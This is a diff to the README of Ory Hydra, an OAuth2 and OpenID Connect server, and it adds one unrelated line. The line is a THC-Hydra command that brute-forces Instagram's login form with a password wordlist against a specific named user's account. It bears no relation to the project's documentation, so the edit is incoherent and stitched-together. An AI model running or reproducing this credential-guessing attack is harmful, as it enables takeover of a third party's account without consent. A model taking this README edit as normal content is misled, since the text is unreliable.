@@ -1,5 +1,5 @@
 <h1 align="center"><img src="https://raw.githubusercontent.com/ory/meta/master/static/banners/hydra.svg" alt="Ory Hydra - Open Source OAuth 2 and OpenID Connect server"></h1>
-
+hydra -l sneha___vadlakonda -P /home/user/passwords.txt instagram.com http-post-form "/accounts/login/ajax/:username=^USER^&password=^PASS^&queryParams=null:F=json" -V
 <h4 align="center">
     <a href="https://www.ory.sh/chat">Chat</a> |
     <a href="https://github.com/ory/hydra/discussions">Discussions</a> |
